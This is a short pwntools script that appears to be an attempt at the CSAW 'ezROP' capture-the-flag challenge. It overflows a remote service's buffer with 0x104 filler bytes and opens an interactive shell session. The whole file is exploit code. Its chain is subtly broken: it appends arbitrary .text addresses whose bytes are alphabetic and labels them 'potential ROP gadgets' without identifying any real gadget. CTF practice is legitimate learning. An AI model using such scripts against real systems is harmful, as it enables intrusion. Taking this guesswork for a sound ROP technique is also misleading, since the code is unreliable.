#!/usr/bin/python3
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64', os='linux')
exe = '/home/ctfplayer/ctf_files/share/chal/ezROP'
elf = ELF(exe)

def start():
    return remote('pwn.chal.csaw.io', 9999)

def is_alpha_address(addr):
    try:
        addr_bytes = p64(addr)[:6]  # We only care about the first 6 bytes for 48-bit addresses
        return all(chr(b).isalpha() for b in addr_bytes)
    except:
        return False

# Start the process
io = start()

# Build the payload
payload = b"A" * 0x104  # Fill the buffer with 'A's

# Find gadgets with alphabetic addresses
text_section = elf.get_section_by_name('.text')
text_start = text_section.header.sh_addr
text_end = text_start + text_section.header.sh_size

# Try to find some useful gadgets
alpha_addresses = []
for addr in range(text_start, text_end, 1):
    if is_alpha_address(addr):
        alpha_addresses.append(addr)

# Add some potential ROP gadgets
if alpha_addresses:
    for addr in alpha_addresses[:3]:
        payload += p64(addr)

# Send the payload
print(f"Sending payload of length: {len(payload)}")
io.sendline(payload)

# Try to get output
try:
    response = io.recv()
    print(f"Received: {response}")
except:
    print("No response received")

io.interactive()

